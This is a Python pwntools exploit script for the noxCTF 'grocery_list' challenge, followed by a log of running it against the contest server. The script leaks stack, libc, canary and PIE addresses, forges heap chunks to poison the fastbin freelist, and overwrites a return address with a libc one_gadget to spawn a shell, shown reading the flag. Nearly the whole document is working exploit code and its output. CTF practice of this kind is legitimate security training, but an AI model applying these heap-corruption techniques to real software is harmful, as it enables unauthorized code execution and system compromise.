#!/usr/bin/env python
from pwn import *
import sys

gdbcmd = '''
b *{}+0x1283
'''

# context.terminal = 'kitty @ new-window --keep-focus sh -c'.split()

if sys.argv.__len__() == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = process(sys.argv[1], env={'LD_PRELOAD' : '/Challs/noxCTF/pwn/grocery_list/libc.so'})
    # r = process(sys.argv[1], aslr=False)
    # r = process(sys.argv[1])

def dump_all():
    r.sendlineafter('7. Exit', '1')
    r.recvuntil('----------\n')
    content = r.recvuntil('\n----------', drop=True)
    content = content.splitlines()
    content = [x.split('. ')[1] for x in content]
    return content

def add_item(size, payload):
    r.sendlineafter('7. Exit', '2')
    r.sendlineafter('items?', str(size))
    r.sendlineafter('name:', payload)

def add_empty(size, count):
    r.sendlineafter('7. Exit', '3')
    r.sendlineafter('items?', str(size))
    r.sendlineafter('add?', str(count))

def remove_item(ID):
    r.sendlineafter('7. Exit', '4')
    r.sendlineafter('remove?', str(ID))

def edit_item(ID, payload):
    r.sendlineafter('7. Exit', '5')
    r.sendlineafter('edit?', str(ID))
    r.sendlineafter('name:', payload)

def add_default():
    r.sendlineafter('7. Exit', '6')

def _exit():
    r.sendlineafter('7. Exit', '7')

add_default()
stack = u64(dump_all()[0].ljust(8, '\x00'))
log.info('stack ' + hex(stack))
remove_item(0)

add_empty(1, 4)
remove_item(1)
remove_item(1)
payload  = p64(0) * 3
payload += p64(0x21)
payload += p64(0) * 3
payload += p64(0x21)
payload += p64(stack - 0x1b)
edit_item(0, payload)
add_empty(1, 2)

libc = u64(dump_all()[3].ljust(8, '\x00')) - 0x20830
log.info('libc ' + hex(libc))

remove_item(0)
remove_item(0)
remove_item(0)

payload  = p64(libc + 0x20830)
payload += p64(0)
payload += p64(0x4100)
edit_item(0, payload)

add_empty(2, 4)
remove_item(2)
remove_item(2)
payload  = p64(0) * 7
payload += p64(0x41)
payload += p64(0) * 7
payload += p64(0x41)
payload += p64(stack - 2)
edit_item(1, payload)
add_empty(2, 2)

remove_item(1)
remove_item(1)
remove_item(1)

canary = u64(dump_all()[1][:7].rjust(8, '\x00'))
pie = u64(dump_all()[1][7:].ljust(8, '\x00')) - 0x1380
log.info('canary ' + hex(canary))
log.info('pie ' + hex(pie))

add_empty(3, 4)
remove_item(3)
remove_item(3)
payload  = p64(0) * 13
payload += p64(0x71)
payload += p64(0) * 13
payload += p64(0x71)
payload += p64(pie + 0x20202d)
edit_item(2, payload)
add_empty(3, 2)

remove_item(2)
# gdb.attach(r, gdbcmd.format(pie))
remove_item(2)
remove_item(2)

payload  = p64(libc + 0x45216)
payload += p64(0) * 2
payload += p64(canary)
payload += p64(pie + 0x1380)
payload += p64(libc + 0x45216)
edit_item(0, payload)

payload  = '\x00' * 3
payload += p64(stack - 0xb)
payload += p64(stack - 2 + 16)
payload += p64(pie + 0x20203d)
payload += p64(0) * 18
payload += p64(libc + 0x45216)
edit_item(2, payload)

_exit()
r.interactive()

'''
[+] Opening connection to chal.noxale.com on port 1232: Done
[*] stack 0x7ffec128fb3b
[*] libc 0x7fdf29bb9000
[*] canary 0xedc677284751c5
[*] pie 0x55a4c8cd3000
[*] Switching to interactive mode

Goodbye

$ ls
GroceryList
flag
$ cat flag
noxCTF{I_L0ve_F0rg1ng_Chunk5}
'''